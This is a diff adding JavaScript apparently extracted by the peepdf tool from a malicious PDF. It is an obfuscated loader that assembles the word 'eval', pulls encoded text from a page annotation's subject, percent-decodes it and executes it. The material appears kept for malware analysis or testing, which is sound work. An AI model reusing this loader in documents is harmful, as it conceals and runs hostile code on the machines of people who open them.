@@ -1,0 +1,34 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var param = null;
+var aa = 'e';
+
+if (app.plugIns) {
+    var num = 0;
+
+    app.doc.syncAnnotScan();
+
+    param = app.doc.getAnnots({
+        nPage: num
+    });
+    aa += 'v';
+
+    var sum = param[num + 1].subject;
+}
+
+if (app.plugIns.length > 1) {
+    var pp = "%";
+    aa += 'a';
+    var arr = sum.split(/g/);
+    var buf = "";
+    for (var i = 1; i < arr.length; i++) {
+        buf += unescape(pp + arr[i]);
+    }
+}
+
+aa += 'l';
+
+if (app.plugIns.length >= 1) {
+    app[aa](buf);
+}
+
